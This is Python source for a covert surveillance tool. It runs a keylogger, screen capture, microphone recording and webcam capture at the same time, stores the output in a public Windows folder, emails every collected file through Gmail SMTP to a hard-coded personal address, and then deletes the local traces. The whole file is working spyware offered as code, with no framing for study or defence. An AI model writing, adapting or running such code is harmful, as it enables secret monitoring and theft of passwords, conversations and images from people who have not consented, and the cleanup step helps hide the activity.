import os
import time
import smtplib
import shutil
from multiprocessing import Process
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import sounddevice
from scipy.io.wavfile import write as write_rec
import cv2
import logging


# Function: Keylogging
def log_keys(file_path):
    os.makedirs(file_path, exist_ok=True)
    key_log_file = file_path + 'key_logs.txt'
    logging.basicConfig(filename=key_log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()


# Function: Screenshot Capture
def capture_screenshots(file_path):
    os.makedirs(file_path + 'Screenshots', exist_ok=True)
    for i in range(10):
        pic = ImageGrab.grab()
        pic.save(file_path + f'Screenshots/screenshot{i}.png')
        time.sleep(5)


# Function: Microphone Recording
def record_audio(file_path):
    os.makedirs(file_path, exist_ok=True)
    for i in range(5):
        fs = 44100
        seconds = 10
        recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
        sounddevice.wait()
        write_rec(file_path + f'mic_recording{i}.wav', fs, recording)


# Function: Webcam Capture
def capture_webcam(file_path):
    os.makedirs(file_path + 'WebcamPics', exist_ok=True)
    cam = cv2.VideoCapture(0)

    for i in range(10):
        ret, frame = cam.read()
        if ret:
            cv2.imwrite(file_path + f'WebcamPics/webcam{i}.jpg', frame)
        time.sleep(5)

    cam.release()
    cv2.destroyAllWindows()


# Function: Send Email
def send_email(email_address, app_password, file_path):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = 'Collected Data'

    body = 'Attached are the collected files.'
    msg.attach(MIMEText(body, 'plain'))

    for root, _, files in os.walk(file_path):
        for file in files:
            file_full_path = os.path.join(root, file)
            with open(file_full_path, 'rb') as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={file}')
            msg.attach(part)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_address, app_password)
        server.send_message(msg)
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")


# Cleanup Function
def cleanup(file_path):
    try:
        time.sleep(5)  # Ensure processes have released the files
        shutil.rmtree(file_path)
        print("Cleanup completed successfully.")
    except Exception as e:
        print(f"Error during cleanup: {e}")


# Main Function
def main():
    file_path = 'C:/Users/Public/Logs/'
    os.makedirs(file_path, exist_ok=True)

    # Start Processes
    keylogger_process = Process(target=log_keys, args=(file_path,))
    screenshot_process = Process(target=capture_screenshots, args=(file_path,))
    audio_process = Process(target=record_audio, args=(file_path,))
    webcam_process = Process(target=capture_webcam, args=(file_path,))

    keylogger_process.start()
    screenshot_process.start()
    audio_process.start()
    webcam_process.start()

    # Run processes for a specified duration
    time.sleep(60)  # Adjust the duration as needed

    keylogger_process.terminate()
    screenshot_process.terminate()
    audio_process.terminate()
    webcam_process.terminate()

    # Send Email
    email_address = 'chitralalaxmidevicm@gmail.com'
    app_password = ''  # Replace with Gmail App Password
    send_email(email_address, app_password, file_path)

    # Cleanup Files
    cleanup(file_path)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("Program interrupted.")
    except Exception as e:
        logging.basicConfig(level=logging.DEBUG, filename='error_log.txt')
        logging.exception(f"An error occurred: {e}")
